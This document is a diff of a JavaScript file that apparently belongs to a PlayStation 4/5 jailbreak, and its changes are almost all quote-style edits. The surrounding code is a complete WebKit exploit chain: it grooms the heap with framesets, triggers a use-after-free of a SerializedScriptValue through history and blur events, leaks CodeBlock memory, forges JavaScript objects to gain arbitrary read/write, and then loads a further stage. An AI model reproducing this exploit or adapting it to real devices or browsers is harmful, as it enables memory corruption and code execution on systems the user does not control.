@@ -33,15 +33,15 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 //   * Helped in figuring out the size of JSC::ArrayBufferContents and its
 //     needed offsets on different firmwares (PS5).
 
-import { Int } from "./module/int64.mjs";
-import { Memory,mem } from "./module/mem.mjs";
-import { KB, MB } from "./module/offset.mjs";
-import { BufferView } from "./module/rw.mjs";
+import { Int } from './module/int64.mjs';
+import { Memory,mem } from './module/mem.mjs';
+import { KB, MB } from './module/offset.mjs';
+import { BufferView } from './module/rw.mjs';
 
-import { die, DieError, log, clear_log, sleep, hex, align } from "./module/utils.mjs";
+import { die, DieError, log, clear_log, sleep, hex, align } from './module/utils.mjs';
 
-import * as config from "./config.mjs";
-import * as off from "./module/offset.mjs";
+import * as config from './config.mjs';
+import * as off from './module/offset.mjs';
 
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
@@ -60,7 +60,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
+  log(`console: PS${is_ps4 ? '4' : '5'} | firmware: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -81,7 +81,7 @@ const ssv_len = (() => {
   if (0x900 <= version) {
     return 0x50;
   }
-  throw new RangeError(`unsupported: PS${is_ps4 ? "4" : "5"} | firmware ${hex(version)}`);
+  throw new RangeError(`unsupported: PS${is_ps4 ? '4' : '5'} | firmware ${hex(version)}`);
 })();
 
 // these constants are expected to be divisible by 2
@@ -123,7 +123,7 @@ const num_leaks = 0x100;
 //
 // const num_repeats = ssv_len / 8 - 2;
 // const rows = ','.repeat(num_repeats);
-const rows = ",".repeat(ssv_len / 8 - 2);
+const rows = ','.repeat(ssv_len / 8 - 2);
 
 const original_strlen = ssv_len - off.size_strimpl;
 const original_loc = location.pathname;
@@ -144,7 +144,7 @@ function prepare_uaf() {
 
   function alloc_fs(fsets, size) {
     for (let i = 0; i < size / 2; i++) {
-      const fset = document.createElement("frameset");
+      const fset = document.createElement('frameset');
       fset.rows = rows;
       fset.cols = rows;
       fsets.push(fset);
@@ -155,23 +155,23 @@ function prepare_uaf() {
   // JSC::IsoAlignedMemoryAllocator near the SSV it creates. this prevents
   // the SmallLine where the SSV resides from being freed. so we do a dummy
   // call first
-  history.replaceState("state0", "");
+  history.replaceState('state0', '');
 
   alloc_fs(fsets, num_fsets);
 
-  // the "state1" SSVs is what we will UAF
+  // the 'state1' SSVs is what we will UAF
 
-  history.pushState("state1", "", `${original_loc}#bar`);
+  history.pushState('state1', '', `${original_loc}#bar`);
   indices.push(fsets.length);
 
   alloc_fs(fsets, num_spaces);
 
-  history.pushState("state1", "", `${original_loc}#foo`);
+  history.pushState('state1', '', `${original_loc}#foo`);
   indices.push(fsets.length);
 
   alloc_fs(fsets, num_spaces);
 
-  history.pushState("state2", "");
+  history.pushState('state2', '');
   return [fsets, indices];
 }
 
@@ -179,15 +179,15 @@ function prepare_uaf() {
 //
 // be careful when accessing history.state since History::state() will get
 // called. History will cache the SSV at its m_lastStateObjectRequested if you
-// do. that field is a RefPtr, thus preventing a UAF if we cache "state1"
+// do. that field is a RefPtr, thus preventing a UAF if we cache 'state1'
 async function uaf_ssv(fsets, index, index2) {
   const views = [];
-  const input = document.createElement("input");
-  input.id = "input";
-  const foo = document.createElement("input");
-  foo.id = "foo";
-  const bar = document.createElement("a");
-  bar.id = "bar";
+  const input = document.createElement('input');
+  input.id = 'input';
+  const foo = document.createElement('input');
+  foo.id = 'foo';
+  const bar = document.createElement('a');
+  bar.id = 'bar';
 
   log(`ssv_len: ${hex(ssv_len)}`);
 
@@ -210,7 +210,7 @@ async function uaf_ssv(fsets, index, index2) {
     if (no_pop) {
       pop_promise2 = new Promise((resolve, reject) => {
         resolves.push([resolve, reject]);
-        addEventListener("popstate", onpopstate, { once: true });
+        addEventListener('popstate', onpopstate, { once: true });
         history.back();
       });
     }
@@ -225,7 +225,7 @@ async function uaf_ssv(fsets, index, index2) {
 
   const pop_promise = new Promise((resolve, reject) => {
     resolves.push([resolve, reject]);
-    addEventListener("popstate", onpopstate, { once: true });
+    addEventListener('popstate', onpopstate, { once: true });
   });
 
   function onblur(event) {
@@ -240,16 +240,16 @@ async function uaf_ssv(fsets, index, index2) {
 
     // we replace the URL with the original so the user can rerun the
     // exploit via a reload. If we don't, the exploit will append another
-    // "#foo" to the URL and the input element will not be blurred because
+    // '#foo' to the URL and the input element will not be blurred because
     // the foo element won't be scrolled to during history.back()
-    history.replaceState("state3", "", original_loc);
+    history.replaceState('state3', '', original_loc);
 
     // free the SerializedScriptValue's neighbors and thus free the
     // SmallLine where it resides
     const fset_idx = is_input ? index : index2;
     for (let i = fset_idx - num_adjs / 2; i < fset_idx + num_adjs / 2; i++) {
-      fsets[i].rows = "";
-      fsets[i].cols = "";
+      fsets[i].rows = '';
+      fsets[i].cols = '';
     }
 
     for (let i = 0; i < num_reuses; i++) {
@@ -261,8 +261,8 @@ async function uaf_ssv(fsets, index, index2) {
     blurs[idx]++;
   }
 
-  input.addEventListener("blur", onblur);
-  foo.addEventListener("blur", onblur);
+  input.addEventListener('blur', onblur);
+  foo.addEventListener('blur', onblur);
 
   document.body.append(input);
   document.body.append(foo);
@@ -272,15 +272,15 @@ async function uaf_ssv(fsets, index, index2) {
   // statePopped() will defer firing of popstate until we're in the complete
   // state
   //
-  // this means that onblur() will run with "state2" as the current history
+  // this means that onblur() will run with 'state2' as the current history
   // item if we call loadInSameDocument too early
   log(`readyState now: ${document.readyState}`);
 
-  if (document.readyState !== "complete") {
+  if (document.readyState !== 'complete') {
     await new Promise((resolve) => {
-      document.addEventListener("readystatechange", function foo() {
-        if (document.readyState === "complete") {
-          document.removeEventListener("readystatechange", foo);
+      document.addEventListener('readystatechange', function foo() {
+        if (document.readyState === 'complete') {
+          document.removeEventListener('readystatechange', foo);
           resolve();
         }
       });
@@ -290,7 +290,7 @@ async function uaf_ssv(fsets, index, index2) {
   log(`readyState now: ${document.readyState}`);
 
   await new Promise((resolve) => {
-    input.addEventListener("focus", resolve, { once: true });
+    input.addEventListener('focus', resolve, { once: true });
     input.focus();
   });
 
@@ -298,7 +298,7 @@ async function uaf_ssv(fsets, index, index2) {
   await pop_promise;
   await pop_promise2;
 
-  log("done await popstate");
+  log('done await popstate');
 
   input.remove();
   foo.remove();
@@ -309,7 +309,7 @@ async function uaf_ssv(fsets, index, index2) {
     const view = views[i];
     if (view[0] !== 0x41) {
       log(`view index: ${hex(i)}`);
-      log("found view:");
+      log('found view:');
       log(view);
 
       // set SSV's refcount to 1, all other fields to 0/NULL
@@ -329,7 +329,7 @@ async function uaf_ssv(fsets, index, index2) {
   }
 
   if (res.length !== 2) {
-    die("failed SerializedScriptValue UAF");
+    die('failed SerializedScriptValue UAF');
   }
   return res;
 }
@@ -377,9 +377,9 @@ async function make_rdr(view) {
   const u32 = new Uint32Array(1);
   const u8 = new Uint8Array(u32.buffer);
   const marker_offset = original_strlen - 4;
-  const pad = "B".repeat(marker_offset);
+  const pad = 'B'.repeat(marker_offset);
 
-  log("start string spray");
+  log('start string spray');
   while (true) {
     for (let i = 0; i < num_strs; i++) {
       u32[0] = i;
@@ -389,7 +389,7 @@ async function make_rdr(view) {
       // * Array.prototype.join() won't try to convert 16-bit strings to
       //   8-bit
       //
-      // given the restrictions above, we will ensure "str" is always a
+      // given the restrictions above, we will ensure 'str' is always a
       // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
       // to see that String.prototype.repeat() will create a 8-bit string
       // if the repeated string's length is 1
@@ -398,7 +398,7 @@ async function make_rdr(view) {
       // returns a plain JSString (not a JSRopeString). that means we
       // have allocated a WTF::StringImpl with the proper size and whose
       // string data is inlined
-      const str = [pad, String.fromCodePoint(...u8)].join("");
+      const str = [pad, String.fromCodePoint(...u8)].join('');
       strs.push(str);
     }
 
@@ -416,7 +416,7 @@ async function make_rdr(view) {
 
   const idx = view.read32(off.strimpl_inline_str + marker_offset);
   log(`str index: ${hex(idx)}`);
-  log("view:");
+  log('view:');
   log(view);
 
   // versions like 8.0x have a JSC::JSString that have their own m_length
@@ -429,7 +429,7 @@ async function make_rdr(view) {
   const rstr = Error(strs[idx]).message;
   log(`str len: ${hex(rstr.length)}`);
   if (rstr.length === 0xffffffff) {
-    log("confirmed correct leaked");
+    log('confirmed correct leaked');
     const addr = view.read64(off.strimpl_m_data).sub(off.strimpl_inline_str);
     log(`view's buffer address: ${addr}`);
     return new Reader(rstr, view);
@@ -439,8 +439,8 @@ async function make_rdr(view) {
 
 // we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
 // of JSValues whose size is ssv_len. the undefined constant is automatically
-// added due to reasons such as "undefined is returned by default if the
-// function exits without returning anything"
+// added due to reasons such as 'undefined is returned by default if the
+// function exits without returning anything'
 const cons_len = ssv_len - 8 * 5;
 const bt_offset = 0;
 const idx_offset = ssv_len - 8 * 3;
@@ -477,7 +477,7 @@ const src_part = (() => {
   //    k0 = <JSValue()>
   //    k1 = Undefined
   //    k2 = Int32: 1: in source as integer
-  let res = "var f = 0x11223344;\n";
+  let res = 'var f = 0x11223344;\n';
   // make unique constants that won't collide with the possible marker values
   for (let i = 0; i < cons_len; i += 8) {
     res += `var a${i} = ${num_leaks + i};\n`;
@@ -510,7 +510,7 @@ async function leak_code_block(reader, bt_size) {
   log(`search addr: ${search_addr}`);
 
   log(`func_src:\n${cache[0]}\nfunc_src end`);
-  log("start find CodeBlock");
+  log('start find CodeBlock');
   let winning_off = null;
   let winning_idx = null;
   let winning_f = null;
@@ -557,7 +557,7 @@ async function leak_code_block(reader, bt_size) {
   log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
   log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
 
-  log("CodeBlock.m_constantRegisters.m_buffer:");
+  log('CodeBlock.m_constantRegisters.m_buffer:');
   rdr.set_addr(search_addr.add(winning_off));
   for (let i = 0; i < slen; i += 8) {
     log(`${rdr.read64_at(i)} | ${hex(i)}`);
@@ -568,13 +568,13 @@ async function leak_code_block(reader, bt_size) {
   log(`immutable butterfly addr: ${bt_addr}`);
   log(`string array passed to tag addr: ${strs_addr}`);
 
-  log("JSImmutableButterfly:");
+  log('JSImmutableButterfly:');
   rdr.set_addr(bt_addr);
   for (let i = 0; i < bt_size; i += 8) {
     log(`${rdr.read64_at(i)} | ${hex(i)}`);
   }
 
-  log("string array:");
+  log('string array:');
   rdr.set_addr(strs_addr);
   for (let i = 0; i < off.size_jsobj; i += 8) {
     log(`${rdr.read64_at(i)} | ${hex(i)}`);
@@ -676,7 +676,7 @@ async function make_arw(reader, view2, pop) {
   const propertyStorage = 8;
   const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
 
-  log("STAGE: leak CodeBlock");
+  log('STAGE: leak CodeBlock');
   // has too be greater than 0x10. the size of JSImmutableButterfly
   const bt_size = 0x10 + fakebt_off + arrayStorage_size;
   const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
@@ -691,7 +691,7 @@ async function make_arw(reader, view2, pop) {
   const bt = new BufferView(pop.state);
   view.set(view_save);
 
-  log("ArrayBuffer pointing to JSImmutableButterfly:");
+  log('ArrayBuffer pointing to JSImmutableButterfly:');
   for (let i = 0; i < bt.byteLength; i += 8) {
     log(`${bt.read64(i)} | ${hex(i)}`);
   }
@@ -701,7 +701,7 @@ async function make_arw(reader, view2, pop) {
   // for JSObjects to recursively visit. this means that we can write
   // anything to the the butterfly's data area without fear of a GC crash
 
-  const val_true = 7; // JSValue of "true"
+  const val_true = 7; // JSValue of 'true'
   const strs_cell = rdr.read64(strs_addr);
 
   bt.write64(fakeobj_off, strs_cell);
@@ -796,14 +796,14 @@ async function make_arw(reader, view2, pop) {
   bt.write64(fakebt_off + 0x10, faker_vector);
   const main = fake[0];
 
-  log("main (pointing to worker):");
+  log('main (pointing to worker):');
   for (let i = 0; i < off.size_view; i += 8) {
     const idx = i / 4;
     log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
   }
 
   new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop), rdr.read64(leaker_p.add(off.js_butterfly)));
-  log("achieved arbitrary r/w");
+  log('achieved arbitrary r/w');
 
   rdr.restore();
   // set the refcount to a high value so we don't free the memory, view's
@@ -816,22 +816,23 @@ async function make_arw(reader, view2, pop) {
 }
 
 async function main() {
-  log("STAGE: UAF SSV");
+  log('STAGE: UAF SSV');
   const [fsets, indices] = prepare_uaf();
   const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
 
-  log("STAGE: get string relative read primitive");
+  log('STAGE: get string relative read primitive');
   const rdr = await make_rdr(view);
 
   for (const fset of fsets) {
-    fset.rows = "";
-    fset.cols = "";
+    fset.rows = '';
+    fset.cols = '';
   }
 
-  log("STAGE: achieve arbitrary read/write primitive");
+  log('STAGE: achieve arbitrary read/write primitive');
   await make_arw(rdr, view2, pop);
 
   clear_log();
-  import("./lapse.mjs");
+  // path to your script that will use the exploit
+  import('./lapse.mjs');
 }
 main();
